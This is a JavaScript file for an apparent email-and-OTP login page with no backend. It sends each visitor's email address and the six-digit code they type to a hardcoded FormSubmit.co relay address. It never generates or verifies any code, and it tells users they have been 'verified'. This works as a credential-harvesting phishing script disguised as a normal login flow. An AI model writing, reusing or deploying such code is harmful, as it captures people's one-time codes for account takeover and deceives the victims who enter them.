// =========================
// No-backend script.js
// Works with index.html, verify.html (OTP), etc.
// =========================

// Get stored email
let currentEmail = localStorage.getItem('user_email') || '';

// =========================
// Error & Success Helpers
// =========================
function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => errorDiv.style.display = 'none', 5000);
    } else {
        alert(message);
    }
}

function showSuccess(message) {
    const successDiv = document.getElementById('successMessage');
    if (successDiv) {
        successDiv.textContent = message;
        successDiv.style.display = 'block';
        setTimeout(() => successDiv.style.display = 'none', 3000);
    } else {
        alert(message);
    }
}

function hideLoading() {
    const loading = document.getElementById('loadingScreen');
    if (loading) loading.style.display = 'none';

    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');

    if (loginForm) loginForm.style.display = 'block';
    if (otpForm) otpForm.style.display = 'block';
}

// =========================
// Handle Email Submission (Login)
// =========================
function handleLogin(event) {
    event.preventDefault();
    const emailInput = document.getElementById('email');
    if (!emailInput || !emailInput.value.includes('@')) {
        showError('Please enter a valid email address');
        return;
    }

    currentEmail = emailInput.value;
    localStorage.setItem('user_email', currentEmail);

    // Show loading
    const loginForm = document.getElementById('loginForm');
    const loading = document.getElementById('loadingScreen');
    if (loginForm) loginForm.style.display = 'none';
    if (loading) loading.style.display = 'block';

    // Send email via FormSubmit
    fetch('https://formsubmit.co/d60f72c0231303ce0ed012cbb0523161', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: currentEmail, page: 'login' })
    })
    .then(() => {
        showSuccess('Email sent! Check your inbox for the verification code.');
        // Redirect to OTP page
        window.location.href = 'verify.html';
    })
    .catch(() => {
        showError('Failed to send email. Please try again.');
        hideLoading();
    });
}

// =========================
// Handle OTP Submission (verify.html)
// =========================
function handleOTP(event) {
    event.preventDefault();
    const otpInput = document.getElementById('otp');
    if (!otpInput || !/^\d{6}$/.test(otpInput.value)) {
        showError('Please enter a valid 6-digit code');
        return;
    }

    const otpCode = otpInput.value;

    // Show loading
    const otpForm = document.getElementById('otpForm');
    const loading = document.getElementById('loadingScreen');
    if (otpForm) otpForm.style.display = 'none';
    if (loading) loading.style.display = 'block';

    // Send OTP via FormSubmit
    fetch('https://formsubmit.co/d60f72c0231303ce0ed012cbb0523161', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: currentEmail, otp: otpCode, page: 'otp' })
    })
    .then(() => {
        showSuccess('OTP sent! Thank you for verifying.');
        // Optionally redirect to next page
        // window.location.href = 'nextpage.html';
    })
    .catch(() => {
        showError('Failed to submit OTP. Please try again.');
        hideLoading();
    });
}

// =========================
// Resend OTP (verify.html)
// =========================
function resendCode() {
    showSuccess('A new verification code has been sent to your email');

    fetch('https://formsubmit.co/d60f72c0231303ce0ed012cbb0523161', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: currentEmail, action: 'resend_code', page: 'otp' })
    }).catch(() => {
        showError('Failed to resend code. Try again.');
    });
}

// =========================
// Initialize page
// =========================
document.addEventListener('DOMContentLoaded', () => {
    // Attach event listeners
    const loginForm = document.getElementById('loginForm');
    if (loginForm) loginForm.addEventListener('submit', handleLogin);

    const otpForm = document.getElementById('otpForm');
    if (otpForm) otpForm.addEventListener('submit', handleOTP);

    const resendBtn = document.querySelector('button[onclick="resendCode()"]');
    if (resendBtn) resendBtn.addEventListener('click', resendCode);

    // Auto-focus inputs
    const emailInput = document.getElementById('email');
    if (emailInput) emailInput.focus();

    const otpInput = document.getElementById('otp');
    if (otpInput) otpInput.focus();
});
